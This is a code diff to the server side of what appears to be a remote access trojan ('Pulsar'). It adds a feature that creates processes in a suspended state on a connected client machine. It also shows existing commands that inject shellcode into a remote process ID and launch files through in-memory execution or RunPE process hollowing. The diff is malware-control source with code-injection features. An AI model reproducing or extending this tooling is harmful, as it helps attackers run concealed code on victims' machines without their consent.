@@ -12,9 +12,6 @@ using Pulsar.Server.Networking;
 
 namespace Pulsar.Server.Messages
 {
-    /// <summary>
-    /// Handles messages for interacting with remote tasks.
-    /// </summary>
     public class TaskManagerHandler : MessageProcessorBase<Process[]>, IDisposable
     {
         public delegate void ProcessActionPerformedEventHandler(object sender, ProcessAction action, bool result);
@@ -31,9 +28,14 @@ namespace Pulsar.Server.Messages
             _client = client ?? throw new ArgumentNullException(nameof(client));
         }
 
-        public override bool CanExecute(IMessage message) => message is DoProcessResponse
-                                                             || message is GetProcessesResponse
-                                                             || message is DoProcessDumpResponse;
+        // --------------------------------------
+        // UPDATED: Add new DoCreateProcessSuspendedResponse
+        // --------------------------------------
+        public override bool CanExecute(IMessage message) =>
+               message is DoProcessResponse
+            || message is GetProcessesResponse
+            || message is DoProcessDumpResponse
+            || message is DoCreateProcessSuspendedResponse;    // NEW
 
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
@@ -41,15 +43,28 @@ namespace Pulsar.Server.Messages
         {
             switch (message)
             {
-                case DoProcessResponse resp: Execute(sender, resp); break;
-                case GetProcessesResponse resp: Execute(sender, resp); break;
-                case DoProcessDumpResponse resp: Execute(sender, resp); break;
+                case DoProcessResponse resp:
+                    Execute(sender, resp);
+                    break;
+
+                case GetProcessesResponse resp:
+                    Execute(sender, resp);
+                    break;
+
+                case DoProcessDumpResponse resp:
+                    Execute(sender, resp);
+                    break;
+
+                case DoCreateProcessSuspendedResponse resp:    // NEW
+                    Execute(sender, resp);
+                    break;
             }
         }
 
         private void Execute(ISender client, DoProcessResponse message)
         {
-            SynchronizationContext.Post(_ => ProcessActionPerformed?.Invoke(this, message.Action, message.Result), null);
+            SynchronizationContext.Post(_ =>
+                ProcessActionPerformed?.Invoke(this, message.Action, message.Result), null);
         }
 
         private void Execute(ISender client, GetProcessesResponse message)
@@ -63,7 +78,34 @@ namespace Pulsar.Server.Messages
             OnResponseReceived?.Invoke(this, message);
         }
 
+        // --------------------------------------
+        // NEW: Handle suspended creation response
+        // --------------------------------------
+        private void Execute(ISender client, DoCreateProcessSuspendedResponse message)
+        {
+            SynchronizationContext.Post(_ =>
+            {
+                // Trigger ProcessActionPerformed event
+                ProcessActionPerformed?.Invoke(this, ProcessAction.Start, message.Result);
+
+                // If fail, show error
+                if (!message.Result && !string.IsNullOrEmpty(message.Error))
+                {
+                    MessageBox.Show(
+                        $"Failed to create suspended process:\n{message.Error}",
+                        "Create Process (Suspended)",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Error
+                    );
+                }
+            }, null);
+        }
+
+        // ===================================================
+        // Remote Process Operations
+        // ===================================================
         #region Remote Process Operations
+
         public void InjectShellcode(int processId, byte[] shellcode)
         {
             if (shellcode == null || shellcode.Length == 0)
@@ -79,13 +121,32 @@ namespace Pulsar.Server.Messages
                 Shellcode = shellcode
             });
         }
+
+        // --------------------------------------
+        // NEW: Send CreateProcessSuspended request
+        // --------------------------------------
+        public void CreateProcessSuspended(string path)
+        {
+            if (string.IsNullOrWhiteSpace(path))
+            {
+                MessageBox.Show("Process path cannot be empty.", "Invalid Input",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            _client.Send(new DoCreateProcessSuspended
+            {
+                Path = path
+            });
+        }
+
         public void StartProcess(string remotePath,
                                  bool isUpdate = false,
                                  bool executeInMemory = false,
                                  bool useRunPE = false,
                                  string runPETarget = "a",
                                  string runPECustomPath = null,
-                                 bool useSpecialExecution = false)   // <<< NEW ARG
+                                 bool useSpecialExecution = false)
         {
             if (!File.Exists(remotePath))
             {
@@ -97,7 +158,6 @@ namespace Pulsar.Server.Messages
             byte[] fileBytes = File.ReadAllBytes(remotePath);
             string ext = Path.GetExtension(remotePath);
 
-            // Validate special execution restrictions
             if ((executeInMemory || useRunPE) &&
                 !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
             {
@@ -112,18 +172,12 @@ namespace Pulsar.Server.Messages
                 FileBytes = fileBytes,
                 FilePath = remotePath,
                 FileExtension = ext,
-
-                // Existing flags
                 IsUpdate = isUpdate,
                 ExecuteInMemoryDotNet = executeInMemory,
                 UseRunPE = useRunPE,
                 RunPETarget = runPETarget,
                 RunPECustomPath = runPECustomPath,
-
-                // NEW field sent to the client
                 UseSpecialExecution = useSpecialExecution,
-
-                // FileManager execution type
                 IsFromFileManager = false,
                 DownloadUrl = null
             });
@@ -177,15 +231,12 @@ namespace Pulsar.Server.Messages
 
         public void SuspendProcess(int pid, bool suspend)
         {
-            var message = new DoSuspendProcess { Pid = pid, Suspend = suspend };
-            _client.Send(message);
+            _client.Send(new DoSuspendProcess { Pid = pid, Suspend = suspend });
         }
-
 
         #endregion
 
         #region IDisposable
-
         public void Dispose()
         {
             Dispose(true);
@@ -200,7 +251,6 @@ namespace Pulsar.Server.Messages
             OnResponseReceived = null;
             LastProcessesResponse = null;
         }
-
         #endregion
     }
 }
